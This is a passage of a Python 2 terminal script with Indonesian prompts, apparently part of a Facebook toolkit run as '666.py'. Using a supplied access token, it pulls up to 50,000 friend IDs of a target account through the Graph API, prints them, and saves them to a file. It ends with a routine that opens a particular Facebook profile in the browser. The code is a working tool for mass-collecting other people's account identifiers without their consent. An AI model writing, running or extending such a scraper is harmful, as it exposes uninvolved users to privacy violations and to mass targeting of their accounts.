            print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mNama : ' + op['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] ID Publik / Teman Tidak Ada !'
            raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil Semua ID ...')
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;93m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m ' + a['id']

        bz.close()
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[\x1b[1;95m\xe2\x88\x9a\x1b[1;97m] File tersimpan : out/' + done
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[!] File Tidak Tersimpan '
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 666.py')
    except IOError:
        print '\x1b[1;97m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        os.system('python2 666.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m] Teman tidak ada !'
        raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m\xe2\x9c\x96\x1b[1;97m] Tidak ada koneksi !'
        keluar()


def saya():
    os.system('clear')
    print logo
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
    menu()


if __name__ == '__main__':
    menu()
    masuk()